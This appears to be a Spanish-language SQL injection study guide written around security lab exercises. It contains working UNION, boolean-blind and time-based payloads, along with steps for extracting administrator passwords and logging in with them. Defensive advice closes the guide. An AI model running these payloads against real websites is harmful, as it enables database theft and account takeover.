sección 01

01. Conceptos Fundamentales

¿Qué es la Inyección SQL?

Es una vulnerabilidad que ocurre cuando los datos proporcionados por el usuario se concatenan directamente en una consulta SQL sin validación, permitiendo al atacante modificar la estructura de la consulta.

Tipos Comunes de Ataques

  • UNION-based: extrae datos de otras tablas.
  • Boolean-based: infiere información según respuestas verdaderas/falsas.
  • Time-based: usa retrasos para obtener información.
  • Error-based: obtiene información de mensajes de error.

02. Técnicas Básicas de Evasión (Login Bypass)

Estos payloads se usan para omitir la autenticación en formularios de login vulnerables.

Payloads Clásicos

sección 03

03. Determinación del Número de Columnas

Es el paso inicial para cualquier ataque UNION.

Método ORDER BY

PayloadResultado Esperado
' ORDER BY 1--Éxito (hay al menos 1 columna).
' ORDER BY 2--Éxito (hay al menos 2 columnas).
' ORDER BY 3--Si falla, el número de columnas es 2.

Método UNION SELECT NULL

PayloadResultado Esperado
' UNION SELECT NULL--Error (si hay más de 1 columna).
' UNION SELECT NULL,NULL--Éxito (si hay 2 columnas).
' UNION SELECT NULL,NULL,NULL--Éxito (si hay 3 columnas).
sección 04

04. Ataques UNION en MySQL / MariaDB

Identificar Columna de Texto

Primero, encuentra qué columna puede mostrar texto:

sql
' UNION SELECT 'a', NULL, NULL--
' UNION SELECT NULL, 'a', NULL--
' UNION SELECT NULL, NULL, 'a'--

Extraer Información Básica

PropósitoPayload
Versión' UNION SELECT @@version, 'def'#
Base de datos actual' UNION SELECT database(), 'def'#
Usuario actual' UNION SELECT user(), 'def'#
Listar tablas' UNION SELECT table_name, 'def' FROM information_schema.tables WHERE table_schema = database()#
Listar columnas' UNION SELECT column_name, 'def' FROM information_schema.columns WHERE table_name = 'users'#
Extraer datos' UNION SELECT username, password FROM users#
Concatenar columnas' UNION SELECT CONCAT(username, ':', password), 'def' FROM users#

Ejemplo de Extracción de una Tabla users

sql
-- Encontrar las columnas
' UNION SELECT column_name, 'a' FROM information_schema.columns WHERE table_name = 'users'--
-- Resultado: username, password, email

-- Extraer datos
' UNION SELECT username, password FROM users--
-- Resultado: administrator, [password_hash]

sección 06

06. Blind SQL Injection con Respuestas Condicionales

¿Qué es y por qué es difícil?

Es una vulnerabilidad donde la aplicación no muestra los resultados de la consulta SQL ni los errores. En su lugar, el atacante debe inferir información observando cambios en el comportamiento de la página (como un mensaje de "bienvenida") o tiempos de respuesta.

Razón de su dificultad: no hay retroalimentación directa. El ataque se vuelve un proceso de "adivinanza lógica" carácter por carácter, lo que lo hace lento y laborioso sin herramientas como Burp Suite.

¿Cómo identificar esta vulnerabilidad?

La clave está en buscar parámetros que afecten el contenido de la página de manera booleana, y cookies de seguimiento o análisis. Lista de verificación:

PasoAcciónQué buscar
1. Identificar puntos de entradaRevisa todas las cookies, parámetros URL y campos de formulario.Presta especial atención a cookies con nombres como TrackingId, SessionId, Analytics, UserId.
2. Probar una condición verdaderaModifica el valor con ' AND '1'='1 (o su versión codificada).¿La página muestra algún elemento que antes no aparecía (ej: mensaje de bienvenida)?
3. Probar una condición falsaModifica el valor con ' AND '1'='2.¿Ese elemento desapareció?
4. Observar diferenciasCompara las respuestas (puedes usar la herramienta "Comparer" de Burp).Si hay una diferencia clara (como la presencia/ausencia de un texto), es muy probable que sea vulnerable.

Ejemplo práctico de prueba

cookie
Cookie original:      TrackingId=zSaw9vKobKb0LOhY
Prueba 1 (Verdadera): TrackingId=zSaw9vKobKb0LOhY' AND '1'='1
Prueba 2 (Falsa):     TrackingId=zSaw9vKobKb0LOhY' AND '1'='2

Si en la Prueba 1 ves "Welcome back" y en la Prueba 2 no, has encontrado una vulnerabilidad ciega.

Método de Explotación

Fase 1 — Confirmación

  1. Interceptar la petición con Burp Suite.
  2. Modificar la cookie TrackingId con condiciones verdaderas/falsas.
  3. Verificar el cambio en el mensaje "Welcome back".

Fase 2 — Encontrar la longitud de la contraseña

sql
' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>[número])='administrator'
  • Usar Intruder con payload numérico (1–50).
  • El número donde la condición deja de ser verdadera es la longitud.
  • Para este caso fue 20.

Fase 3 — Extraer la contraseña (carácter por carácter)

sql
' AND (SELECT SUBSTRING(password,[posición],1) FROM users WHERE username='administrator')='[carácter]'
  • Usar Intruder con ataque "Cluster Bomb":
    • Payload 1: posición (1 a longitud).
    • Payload 2: caracteres posibles (a-z, A-Z, 0-9, símbolos).
  • Filtrar respuestas que contengan "Welcome back" para obtener la contraseña.

Herramientas y Técnicas para Automatizar

Herramienta/TécnicaUso en este ataque
Burp Suite (Repeater)Probar payloads manualmente.
Burp Suite (Intruder)Automatizar la fuerza bruta de caracteres.
Filtro de respuestaEn Intruder, configurar una regla de "Grep" para buscar "Welcome back".
Ataque "Cluster Bomb"Probar todas las combinaciones de posición y carácter.

¿Cómo proteger mis sitios de esta vulnerabilidad?

  1. Usar consultas parametrizadas (Prepared Statements): es la defensa más efectiva. Separa los datos del código SQL.
  2. Validar y sanitizar entradas: nunca confíes en datos del usuario (cookies, parámetros).
  3. No mostrar mensajes de error detallados: configura respuestas genéricas para evitar filtrar información.
  4. Usar WAF (Web Application Firewall): puede detectar y bloquear patrones de inyección.
  5. Realizar pruebas de penetración periódicas: incluye pruebas de inyección ciega en tus auditorías.

06.2 Inyecciones Ciegas (Time-based)

1 OR IF(1=1, SLEEP(5), 0)--

08. Ejemplo de Ataque Completo (PostgreSQL)

Laboratorio: "Listing database contents on non-Oracle databases"

1. Determinar columnas

sql
' ORDER BY 2--

' UNION SELECT 'a','a'-- (Ambas columnas aceptan texto)

2. Listar tablas

sql
' UNION SELECT table_name,'a' FROM information_schema.tables--
-- Resultado: users_tftprq

3. Listar columnas

sql
' UNION SELECT column_name, 'a' FROM information_schema.columns WHERE table_name = 'users_tftprq'--
-- Resultado: username_rdgnyf, password_nurlle

4. Extraer datos

sql
' UNION SELECT username_rdgnyf, password_nurlle FROM users_tftprq--
-- Resultado: administrator, [password_hash]

5. Iniciar sesión

Usar las credenciales obtenidas.

sección 09

09. Herramientas y Buenas Prácticas

Herramientas Útiles

  • Burp Suite: para interceptar y modificar peticiones HTTP.
  • sqlmap: automatiza la detección y explotación (usar con cuidado).
  • Codificadores online: para preparar payloads.

Buenas Prácticas para Administradores

  1. Usar consultas parametrizadas (Prepared Statements).
  2. Validar y sanitizar todas las entradas del usuario.
  3. Aplicar el principio de mínimo privilegio en las cuentas de base de datos.
  4. Mantener software y sistemas actualizados.
  5. Configurar mensajes de error genéricos que no revelen información interna.
